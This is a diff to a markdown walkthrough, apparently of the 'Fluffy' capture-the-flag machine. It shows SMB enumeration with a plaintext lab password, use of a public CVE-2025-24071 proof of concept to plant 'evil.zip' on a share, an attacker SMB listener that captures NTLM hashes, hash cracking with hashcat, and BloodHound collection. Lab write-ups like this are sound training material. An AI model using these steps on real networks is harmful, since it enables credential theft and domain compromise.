@@ -33,6 +33,9 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 smbmap -H 10.129.186.239 -u j.fleischman -p J0elTHEM4n1990!
 
+
+ <img src="images/smbmap.png" class="report-images" alt="SMBMAP">
+
 smbclient //10.129.186.239/IT -U 'j.fleischman'
 
 mget *
@@ -40,7 +43,9 @@ mget *
 
 On SMB, we see that we have write permission for the IT share, and we find a PDF with vulnerabilities.
 
-Now that we have the list of vulnerabilities, let's move on to exploits.
+
+![!PDF on the SMB](images/notice.png)
+
 
 
 To find a good example of how to run a exploit CVE- Title -github poc in google. 
@@ -52,17 +57,29 @@ You should find https://github.com/LOOKY243/CVE-2025-24071-PoC
 2. python3 `exploit.py -i 10.10.16.40 -s shared -f evil`
  3. Start listener for hash capture:
    `sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support`
-   3. Upload payload to target IT share.
-      `put evil.zip`
+   3. Upload payload to target IT share. 
+    `smbclient //10.129.186.239/IT -U j.fleischman`
+    `put evil.zip`
 
 4. You should see username + hash on listner.
 
 5. Crack the with rockyou.txt: 
   `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
 
-6. Now we have a new username and password. You might try evil-winrm, but the user does not have permission. So, let's enumerate more. Create a BloodHound file and upload to bloodhound review.
+6. Now we have a new username and password. You might try evil-winrm, but the user does not have permission. So, let's enumerate more. C
+
+BloodHound is AD anlsyis tool that helps enuerate objects/principles. 
+
+Create a BloodHound file and upload to bloodhound review.
       `sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
       --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP>`
+       `BloodHound`
+       Should see BloodHound open in new tab in firefox
+       Upload the ladp file we created
+       Search for User we enumerated
+       Examine relationships and you will see this 
+
+       ![BloodHound Scan](images/Bloodhound.png)
 
 
 Observations
